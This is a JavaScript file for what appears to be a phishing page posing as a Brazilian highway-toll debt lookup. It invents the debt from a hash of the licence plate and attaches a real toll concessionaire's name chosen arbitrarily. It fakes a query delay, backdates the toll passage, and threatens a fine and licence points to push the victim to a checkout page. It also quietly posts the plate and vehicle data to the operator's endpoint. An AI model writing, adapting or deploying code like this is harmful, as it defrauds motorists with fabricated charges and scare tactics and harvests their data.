(function(){
  var params = new URLSearchParams(location.search);
  var plate = (params.get('plate')||'').toUpperCase().replace(/[^A-Z0-9]/g,'');
  var plateFormatted = plate.length >= 7 ? plate.substring(0,3) + '-' + plate.substring(3) : plate;

  // Mostra placa no loading
  var loadingPlateEl = document.getElementById('loadingPlate');
  if(loadingPlateEl && plateFormatted) loadingPlateEl.textContent = plateFormatted;

  function formatMoney(v){ return 'R$ ' + v.toFixed(2).replace('.',','); }

  // Gera valor baseado na placa (hash determinístico)
  function getValorByPlate(p){
    var hash = 0;
    for(var i=0; i<p.length; i++){
      hash = ((hash << 5) - hash) + p.charCodeAt(i);
      hash = hash & hash;
    }
    hash = Math.abs(hash);
    // Valores entre R$ 29,00 e R$ 58,00
    var centavos = (hash % 2900) + 2900;
    return centavos / 100;
  }

  // Gera nome de concessionária baseado na placa
  function getConcessionaria(p){
    var concessionarias = ['Ecovias', 'Arteris', 'CCR', 'Ecopistas', 'Autoban', 'Renovias', 'Triângulo do Sol', 'Rota das Bandeiras', 'Via Paulista', 'Intervias'];
    var idx = Math.abs(p.charCodeAt(0) + p.charCodeAt(p.length-1)) % concessionarias.length;
    return concessionarias[idx];
  }

  // Delay de 5 a 10 segundos antes de mostrar os débitos
  var delay = 5000 + Math.floor(Math.random() * 5000);

  setTimeout(function(){
    // Esconde loading e mostra conteúdo
    var overlay = document.getElementById('loadingOverlay');
    if(overlay){
      overlay.style.opacity = '0';
      overlay.style.transition = 'opacity 0.5s';
      setTimeout(function(){ overlay.style.display = 'none'; }, 500);
    }
    var mainContent = document.getElementById('mainContent');
    if(mainContent) mainContent.style.display = 'block';

    // Preenche dados
    initPage();
  }, delay);

  // Aplicar imagem de fundo ao hero-strap
  var heroStrap = document.querySelector('.hero-strap');
  if(heroStrap) {
    heroStrap.style.backgroundImage = "url('https://i.imgur.com/MUtzfrj.jpeg')";
    heroStrap.style.backgroundSize = 'cover';
    heroStrap.style.backgroundPosition = 'center';
    heroStrap.style.backgroundAttachment = 'fixed';
    heroStrap.style.backgroundRepeat = 'no-repeat';
    heroStrap.style.minHeight = '300px';
    heroStrap.style.height = '300px';
    
    // Garantir que a imagem fique acima do SVG
    var svg = heroStrap.querySelector('svg');
    if(svg) {
      svg.style.opacity = '0.3';
      svg.style.mixBlendMode = 'overlay';
    }
  }

  function initPage(){
    // Preenche placa no input
    var _vInfo = JSON.parse(sessionStorage.getItem('vehicleData')||'{}');
    var inp = document.getElementById('qPlaca');
    if(inp){
      if(_vInfo.brand && _vInfo.model){
        var vTxt = _vInfo.brand + ' ' + _vInfo.model + (_vInfo.year ? ' · ' + _vInfo.year : '');
        inp.value = plateFormatted + '  —  ' + vTxt;
        inp.style.fontSize = '14px';
      } else {
        inp.value = plateFormatted;
      }
    }

    // Preenche data/hora
    var now = new Date();
    var dd = String(now.getDate()).padStart(2,'0');
    var mm = String(now.getMonth()+1).padStart(2,'0');
    var yyyy = now.getFullYear();
    var hh = String(now.getHours()).padStart(2,'0');
    var mi = String(now.getMinutes()).padStart(2,'0');
    var checkedAtEl = document.getElementById('debitoCheckedAt');
    if(checkedAtEl) checkedAtEl.textContent = dd+'/'+mm+'/'+yyyy+' - '+hh+':'+mi;

    // Data de infração (amanhã)
    var tomorrow = new Date(now.getTime()+86400000);
    var td = String(tomorrow.getDate()).padStart(2,'0');
    var tm = String(tomorrow.getMonth()+1).padStart(2,'0');
    var ty = tomorrow.getFullYear();
    var dataInfracaoEl = document.getElementById('dataInfracao');
    if(dataInfracaoEl) dataInfracaoEl.textContent = td+'/'+tm+'/'+ty;

    // Renderiza débitos
    renderDebitos();
  }

  function renderDebitos(){
    var lista = document.getElementById('listaDebitos');
    if(!lista) return;

    var valor = getValorByPlate(plate || 'ABC1234');
    var concessionaria = getConcessionaria(plate || 'ABC1234');
    var _vInfo = JSON.parse(sessionStorage.getItem('vehicleData')||'{}');

    // Título do débito
    var titulo = 'Passagem ' + concessionaria;
    if(_vInfo.brand && _vInfo.model){
      titulo = 'Passagem ' + concessionaria + ' — ' + _vInfo.brand + ' ' + _vInfo.model;
    }

    // Data da passagem (3 dias atrás)
    var passagemDate = new Date(Date.now() - 3*86400000);
    var pd = String(passagemDate.getDate()).padStart(2,'0');
    var pm = String(passagemDate.getMonth()+1).padStart(2,'0');
    var py = passagemDate.getFullYear();
    var descricao = 'Pedágio ' + concessionaria + ' - ' + pd+'/'+pm+'/'+py;

    var html = '<li class="row">'
      + '<input type="checkbox" class="debito-checkbox" data-valor="'+valor+'" checked>'
      + '<div>'
        + '<strong>'+titulo+'</strong>'
        + '<div style="font-size:14px;color:#6b7280;margin-top:4px">'+descricao+'</div>'
      + '</div>'
      + '<div style="font-weight:700;font-size:18px;color:#000;text-align:right">'+formatMoney(valor)+'</div>'
      + '</li>';

    // Alerta de multa em vermelho
    html += '<div class="alerta-multas">'
      + '<svg width="24" height="24" viewBox="0 0 24 24" fill="none">'
        + '<path d="M12 2L1 21h22L12 2z" fill="white"></path>'
        + '<path d="M12 8v5M12 16h.01" stroke="#dc2626" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>'
      + '</svg>'
      + '<span>Evite multas! Em caso de não pagamento, a infração é de<br><strong>R$ 195,23 e 5 pontos na CNH.</strong></span>'
      + '</div>';

    lista.innerHTML = html;

    // Atualiza total
    document.getElementById('totalValue').textContent = formatMoney(valor);
    document.getElementById('modalValor').textContent = formatMoney(valor);
    sessionStorage.setItem('debitoTotal', valor);

    // Notifica via API (silencioso)
    var _vd = JSON.parse(sessionStorage.getItem('vehicleData')||'{}');
    fetch('/api/notify/plate-search',{
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body:JSON.stringify(Object.assign({plate:plateFormatted,amount:valor},_vd))
    }).catch(function(){});

    setupCheckboxes();
    setupButtons(valor);
  }

  function setupCheckboxes(){
    var lista = document.getElementById('listaDebitos');
    if(!lista) return;
    lista.addEventListener('change', function(e){
      if(e.target.classList.contains('debito-checkbox')){
        var total = 0;
        document.querySelectorAll('.debito-checkbox:checked').forEach(function(cb){
          total += parseFloat(cb.getAttribute('data-valor')) || 0;
        });
        total = Math.round(total*100)/100;
        document.getElementById('totalValue').textContent = formatMoney(total);
        sessionStorage.setItem('debitoTotal', total);
      }
    });
  }

  function setupButtons(total){
    var btnContinuar = document.getElementById('btnContinuar');
    if(btnContinuar){
      btnContinuar.onclick = function(){
        var t = 0;
        document.querySelectorAll('.debito-checkbox:checked').forEach(function(cb){
          t += parseFloat(cb.getAttribute('data-valor')) || 0;
        });
        t = Math.round(t*100)/100;
        // Mostra modal de atenção antes de ir para checkout
        document.getElementById('atencaoModal').classList.add('is-open');
        // Guarda o valor para o botão "Entendi"
        document.getElementById('btnEntendi').setAttribute('data-checkout-url', 'checkout.html?plate=' + encodeURIComponent(plateFormatted) + '&amount=' + t);
      };
    }

    function closeModal(){ document.getElementById('atencaoModal').classList.remove('is-open'); }
    function goBack(){ closeModal(); location.href = 'pedagio.html'; }

    var btnCancelar = document.getElementById('btnCancelar');
    var btnEntendi = document.getElementById('btnEntendi');
    var modalOverlay = document.getElementById('modalOverlay');

    if(btnCancelar) btnCancelar.onclick = goBack;
    if(btnEntendi) btnEntendi.onclick = function(){
      var url = this.getAttribute('data-checkout-url');
      if(url) location.href = url;
      else closeModal();
    };
    if(modalOverlay) modalOverlay.onclick = closeModal;
  }
})();
